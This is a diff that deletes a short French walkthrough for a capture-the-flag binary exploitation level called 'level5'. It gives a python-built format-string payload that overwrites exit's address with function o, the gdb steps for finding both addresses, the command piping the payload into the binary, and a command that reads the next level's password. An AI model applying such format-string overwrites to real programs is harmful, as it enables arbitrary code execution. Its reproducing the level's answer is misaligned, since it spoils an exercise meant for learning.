@@ -1,8 +1,0 @@
-python -c 'print "\x38\x98\x04\x08" + "%33952d%4$hn"' > /tmp/ok
-tu recuperes l'addresse de exit comme ceci, tu fais un disas n puis tu vois le call sur exit avec une adresse tu fais un x/i addr
-puis comme juste les deux derniers octets ne sont pas identique
-tu récuperes l'adresse de la function o dans gdb avec: p o
-tu transformes les 4 derniers octets en decimal ce qui donne 33956
-tu retires -4 a 33952 car c'est la ou tu commences a écrire
-tu lances apres cat /tmp/ok - | ./level5
-et cd ../level6 && cat .pass
